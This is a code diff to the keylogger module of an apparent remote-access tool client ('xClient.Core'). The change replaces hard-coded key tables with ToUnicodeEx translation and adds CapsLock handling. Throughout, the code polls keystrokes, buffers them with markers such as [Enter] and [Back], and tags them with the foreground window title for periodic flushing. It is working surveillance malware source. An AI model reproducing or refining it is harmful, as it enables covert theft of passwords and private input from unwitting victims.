@@ -4,6 +4,7 @@ using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
+using System.Diagnostics;
 
 namespace xClient.Core
 {
@@ -20,6 +21,9 @@ namespace xClient.Core
 
         [DllImport("User32.dll")]
         public static extern int GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+        public static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
 
         public bool Enabled
         {
@@ -38,6 +42,14 @@ namespace xClient.Core
             get
             {
                 return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
+            }
+        }
+
+        public static bool CapsLock
+        {
+            get
+            {
+                return Control.IsKeyLocked(Keys.CapsLock);
             }
         }
 
@@ -65,9 +77,9 @@ namespace xClient.Core
                8,
                9,
                13,
+			   20,
                32,
                46,
-               92
             };
 
             for (int i = 48; i <= 57; i++)
@@ -102,18 +114,6 @@ namespace xClient.Core
             this.timerFlush.Interval = flushInterval;
         }
 
-        public static string GetActiveWindowTitle()
-        {
-            int hwnd = GetForegroundWindow();
-
-            StringBuilder sbTitle = new StringBuilder(1024);
-
-            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
-
-            string title = sbTitle.ToString();
-
-            return title != "" ? title : null;
-        }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
@@ -133,114 +133,49 @@ namespace xClient.Core
                         }
                     }
 
-                    if (i.ToString() == "8") //Backspace
-                        keyBuffer += "[Back]";
-                    else if (i.ToString() == "9") //Tab
-                        keyBuffer += "[Tab]";
-                    else if (i.ToString() == "13") //Enter
-                        keyBuffer += "[Enter]\n";
-                    else if (i.ToString() == "32") //Spacebar
-                        keyBuffer += " ";
-                    else if (i.ToString() == "46") //Delete
-                        keyBuffer += "[Del]";
-
-                    if (ShiftKey)
+                    switch (i)
                     {
-                        if (i >= 65 && i <= 122)
+                        case 8:
+                            keyBuffer += "[Back]";
+                            return;
+                        case 9:
+                            keyBuffer += "[Tab]";
+                            return;
+                        case 13:
+                            keyBuffer += "[Enter]\n";
+                            return;
+                        case 32:
+                            keyBuffer += " ";
+                            return;
+                        case 46:
+                            keyBuffer += "[Del]";
+                            return;
+                    }
+
+                    if (ShiftKey && CapsLock)
+                    {
+                        if (enumValues.Contains(i))
                         {
-                            keyBuffer += (char)i; //A-Z
+                            keyBuffer += FromKeys(i, false);
+                            return;
                         }
-                        else if (i.ToString() == "48")
-                            keyBuffer += ")";
-                        else if (i.ToString() == "49")
-                            keyBuffer += "!";
-                        else if (i.ToString() == "50")
-                            keyBuffer += "@";
-                        else if (i.ToString() == "51")
-                            keyBuffer += "#";
-                        else if (i.ToString() == "52")
-                            keyBuffer += "$";
-                        else if (i.ToString() == "53")
-                            keyBuffer += "%";
-                        else if (i.ToString() == "54")
-                            keyBuffer += "^";
-                        else if (i.ToString() == "55")
-                            keyBuffer += "&";
-                        else if (i.ToString() == "56")
-                            keyBuffer += "*";
-                        else if (i.ToString() == "57")
-                            keyBuffer += "(";
-                        else if (i.ToString() == "186")
-                            keyBuffer += ":";
-                        else if (i.ToString() == "187")
-                            keyBuffer += "+";
-                        else if (i.ToString() == "188")
-                            keyBuffer += "<";
-                        else if (i.ToString() == "189")
-                            keyBuffer += "_";
-                        else if (i.ToString() == "190")
-                            keyBuffer += ">";
-                        else if (i.ToString() == "191")
-                            keyBuffer += "?";
-                        else if (i.ToString() == "192")
-                            keyBuffer += "~";
-                        else if (i.ToString() == "219")
-                            keyBuffer += "{";
-                        else if (i.ToString() == "220")
-                            keyBuffer += "|";
-                        else if (i.ToString() == "221")
-                            keyBuffer += "}";
-                        else if (i.ToString() == "222")
-                            keyBuffer += "\"";
+                    }
+
+                    if (ShiftKey || CapsLock)
+                    {
+                        if (enumValues.Contains(i))
+                        {
+                            keyBuffer += FromKeys(i, true);
+                            return;
+                        }
                     }
                     else
                     {
-                        if (i >= 65 && i <= 122)
+                        if (enumValues.Contains(i))
                         {
-                            keyBuffer += (char)(i + 32); //a-z
+                            keyBuffer += FromKeys(i, false);
+                            return;
                         }
-                        else if (i.ToString() == "48")
-                            keyBuffer += "0";
-                        else if (i.ToString() == "49")
-                            keyBuffer += "1";
-                        else if (i.ToString() == "50")
-                            keyBuffer += "2";
-                        else if (i.ToString() == "51")
-                            keyBuffer += "3";
-                        else if (i.ToString() == "52")
-                            keyBuffer += "4";
-                        else if (i.ToString() == "53")
-                            keyBuffer += "5";
-                        else if (i.ToString() == "54")
-                            keyBuffer += "6";
-                        else if (i.ToString() == "55")
-                            keyBuffer += "7";
-                        else if (i.ToString() == "56")
-                            keyBuffer += "8";
-                        else if (i.ToString() == "57")
-                            keyBuffer += "9";
-                        else if (i.ToString() == "92")
-                            keyBuffer += "`";
-                        else if (i.ToString() == "186")
-                            keyBuffer += ";";
-                        else if (i.ToString() == "187")
-                            keyBuffer += "=";
-                        else if (i.ToString() == "188")
-                            keyBuffer += ",";
-                        else if (i.ToString() == "189")
-                            keyBuffer += "-";
-                        else if (i.ToString() == "190")
-                            keyBuffer += ".";
-                        else if (i.ToString() == "191")
-                            keyBuffer += "/";
-                        else if (i.ToString() == "219")
-                            keyBuffer += "[";
-                        else if (i.ToString() == "220")
-                            keyBuffer += "\\";
-                        else if (i.ToString() == "221")
-                            keyBuffer += "]";
-                        else if (i.ToString() == "222")
-                            keyBuffer += "'";
                     }
                 }
             }
@@ -287,6 +222,31 @@ namespace xClient.Core
 
             keyBuffer = "";
         }
+
+        public static string GetActiveWindowTitle()
+        {
+            int hwnd = GetForegroundWindow();
+
+            StringBuilder sbTitle = new StringBuilder(1024);
+
+            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
+
+            string title = sbTitle.ToString();
+
+            return title != "" ? title : null;
+        }
+
+        public static char? FromKeys(int keys, bool shift)
+        {
+            var keyStates = new byte[256];
+
+            if (shift)
+                keyStates[16] = 0x80;
+
+            var sb = new StringBuilder(10);
+
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, InputLanguage.CurrentInputLanguage.Handle) == 1 ? (char?)sb[0] : null;
+        }
     }
 }
- 
+
